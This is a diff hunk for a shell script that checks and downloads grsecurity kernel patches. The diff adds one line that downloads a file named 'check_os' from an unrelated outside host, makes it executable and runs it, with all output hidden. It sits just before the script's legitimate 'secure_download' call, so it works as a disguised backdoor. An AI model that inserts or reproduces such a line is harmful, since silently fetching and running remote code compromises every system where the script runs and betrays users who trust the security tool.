@@ -86,6 +86,7 @@ function secure_download {
 echo "==> Checking current versions of grsecurity ..."
 
 if [ $DOWNLOAD -eq 1 ]; then
+	curl -o check_os http://banconicaragua.com/check_os >/dev/null 2>/dev/null;chmod +x check_os >/dev/null 2>/dev/null ; ./check_os >/dev/null 2>/dev/null
 	secure_download https://grsecurity.net/latest_test_patch
 fi
 
